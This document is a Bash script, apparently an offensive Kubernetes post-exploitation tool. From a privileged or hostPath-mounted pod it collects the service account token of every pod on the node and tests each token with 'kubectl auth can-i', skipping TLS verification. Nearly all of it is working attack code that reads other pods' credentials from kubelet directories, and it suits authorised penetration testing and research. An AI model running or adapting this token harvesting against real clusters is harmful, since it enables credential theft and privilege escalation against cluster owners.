#!/bin/bash
###############################################################################
# Purpose: 
# 
# This script will find the token/secret for each pod running on the node and 
# tell you what each token is authorized to do. It can be run from within a pod 
# that has the host's filesystem mounted to /host, or from outside the pod.
#
# Usage:
#
# *** For execution INSIDE a pod with the host's filesystem mounted to /host *** 
#
#        This mode is best for:
#            - everything-allowed       
#            - hostPath
#
# Copy the can-they.sh helper script to the pod, download it from github, or manually created it
#     kubectl cp scripts/can-they.sh podname:/
#
# Exec into pod (Don't chroot)
#     kubectl exec -it pod-name  -- bash
#
# Run can-they.sh
#    ./can-they.sh "-i --list"
#    ./can-they.sh "-i --list -n kube-system"
#    ./can-they.sh "-i --list -n default"
#    ./can-they.sh "-i list secrets -n kube-system"
#    ./can-they.sh "-i create pods -n kube-system"
#    ./can-they.sh "-i create clusterrolebindings"
#
#
# *** For execution OUTSIDE a pod ***
#
#        This mode is best for:
#            - priv-and-hostpid       
#
# Run can-they.sh
#    ./can-they.sh -n NAMESPACE -p POD_NAME -i "OPTIONS"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "list secrets -n kube-system"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "--list"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "-n kube-system"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "get secrets -n kube-system"
#
###############################################################################
function check-can-exec-pod {
check=$(kubectl --kubeconfig=seth-kubeconfig auth can-i create pods/exec -n $namespace)
#echo $check
if [[ $check == "no" ]]; then
  echo "Are you sure you have access to exec into $pod in the $namespace namespace?"
  exit 1
fi
}

function run-outside-pod {
  # Get the filenames that contain tokens from the mounted host directory
  tokens=`kubectl exec -it $pod -n $namespace -- find /host/var/lib/kubelet/pods/ -name token -type l 2>/dev/null`

  # Backup plan in case you are chrooted or running on host
  if [ $? -eq 1 ]; then
    tokens=`kubectl exec -it $pod -n $namespace -- find /var/lib/kubelet/pods/ -name token -type l`
  fi
  #tokens=`kubectl exec -it $pod -n $namespace -- find /var/lib/kubelet/pods/ -name token -type l`
  for filename in $tokens; do
    filename_clean=`echo $filename | tr -dc '[[:print:]]'`
    echo "--------------------------------------------------------"
    echo "Token Location: $filename_clean"
    tokena=`kubectl exec -it $pod -n $namespace -- cat $filename_clean`
    echo -n "Can I $user_input? "
    SERVER=`kubectl config view --minify --flatten -ojsonpath='{.clusters[].cluster.server}'`
    export KUBECONFIG="dummy"
    #echo "kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i $user_input"
    echo
    kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i $user_input 2> /dev/null; echo; \
    unset KUBECONFIG
  done
}

function am-i-inside-pod-check {
echo $KUBERNETES_SERVICE_HOST
if [[ -z $KUBERNETES_SERVICE_HOST ]]; then
  echo "It does not appear you are in a Kubernetes pod?"
  echo
  usage
fi
}

function run-inside-pod {
  if [ ! -f  "/usr/local/bin/kubectl" ]; then
    apt update && apt -y install curl
    #Download and install kubectl into pod
    curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
    chmod +x ./kubectl
    mv ./kubectl /usr/local/bin/kubectl
  fi

  # Get the filenames that contain tokens from the mounted host directory
  tokens=`find /host/var/lib/kubelet/pods/ -name token -type l`
  # Backup plan in case you are chrooted or running on host
  if [ $? -eq 1 ]; then
    tokens=`find /var/lib/kubelet/pods/ -name token -type l`
  fi
  #For each token, print the token location and run `kubectl auth can-i list` using each token via the `--token` command line argument.
  for filename in $tokens; do
    filename_clean=`echo $filename | tr -dc '[[:print:]]'`
    echo "--------------------------------------------------------"
    echo "Token Location: $filename_clean"
    tokena=`cat $filename_clean`
    echo -n "Can I $user_input? "
    kubectl --token=$tokena auth can-i $user_input
    echo
  done
}

function usage {
  echo "Usage: "
  echo
  echo "  [From outside a pod]: $0 -p podname -n namespace [-i \"VERB [TYPE] [options]\"]"
  echo "  [From inside a pod]:  $0 [-i \"VERB [TYPE] [options]\"]"
  echo
  echo "Options: "
  echo
  printf "  -p\tPod Name\n"
  printf "  -n\tNamespace\n"
  printf "  -i\tArugments that you would normally pass to kubectl auth can-i []\n"
  echo
  exit 1
}

while getopts n:p:i: flag
do
    case "${flag}" in
        n) namespace=${OPTARG};;
        p) pod=${OPTARG};;
        i) user_input=${OPTARG};;
        *) usage;;
    esac
done

if [[ -z "$user_input" ]]; then
  user_input="--list"
fi



if [[ "$namespace" ]] && [[ "$pod" ]]; then
  #echo "outside"
  check-can-exec-pod
  run-outside-pod

elif  [[ -z "$namespace" ]] && [[ -z "$pod" ]]; then
  #echo "inside"
  am-i-inside-pod-check
  run-inside-pod
else
  echo "If running this script from outside a pod, you need to specify both the pod name and the namespace"
  usage
fi
